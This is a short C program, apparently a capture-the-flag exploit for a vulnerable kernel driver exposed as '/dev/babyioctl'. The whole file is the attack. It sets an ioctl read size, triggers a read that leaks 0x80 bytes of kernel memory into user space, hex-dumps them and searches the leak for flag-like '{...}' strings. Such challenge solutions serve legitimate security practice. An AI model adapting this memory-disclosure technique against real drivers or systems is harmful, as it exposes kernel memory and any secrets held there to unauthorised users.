#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/babyioctl"
#define BABY_IOCTL_MAGIC 0xBA
#define BABY_IOCTL_SET_SIZE _IOW(BABY_IOCTL_MAGIC, 0, size_t)
#define BABY_IOCTL_READ _IOW(BABY_IOCTL_MAGIC, 1, struct baby_req)

struct baby_req {
	char *buf;
};

static void hex_dump(const unsigned char *buf, size_t len)
{
	size_t i;

	for (i = 0; i < len; i++) {
		printf("%02x ", buf[i]);
		if ((i + 1) % 16 == 0)
			printf("\n");
	}

	if (len % 16 != 0)
		printf("\n");
}

static void print_flag_candidates(const unsigned char *buf, size_t len)
{
	size_t i;
	int found = 0;

	for (i = 0; i < len; i++) {
		size_t j;

		if (buf[i] < 0x20 || buf[i] > 0x7e)
			continue;

		for (j = i; j < len && buf[j] >= 0x20 && buf[j] <= 0x7e; j++)
			;

		if (memchr(buf + i, '{', j - i) != NULL &&
		    memchr(buf + i, '}', j - i) != NULL) {
			printf("[+] candidate = %.*s\n", (int)(j - i), buf + i);
			found = 1;
		}

		i = j;
	}

	if (!found)
		printf("[-] no printable {...} candidate found in leak\n");
}

int main(void)
{
	int fd;
	size_t leak_size = 0x80;
	unsigned char leak[0x80];
	struct baby_req req = {
		.buf = (char *)leak,
	};

	memset(leak, 0, sizeof(leak));

	fd = open(DEVICE_PATH, O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "open %s failed: %s\n", DEVICE_PATH, strerror(errno));
		return 1;
	}

	if (ioctl(fd, BABY_IOCTL_SET_SIZE, &leak_size) < 0) {
		fprintf(stderr, "SET_SIZE failed: %s\n", strerror(errno));
		close(fd);
		return 1;
	}

	if (ioctl(fd, BABY_IOCTL_READ, &req) < 0) {
		fprintf(stderr, "READ failed: %s\n", strerror(errno));
		close(fd);
		return 1;
	}

	printf("[+] leaked %zu bytes\n", leak_size);
	hex_dump(leak, leak_size);
	print_flag_candidates(leak, leak_size);

	close(fd);
	return 0;
}
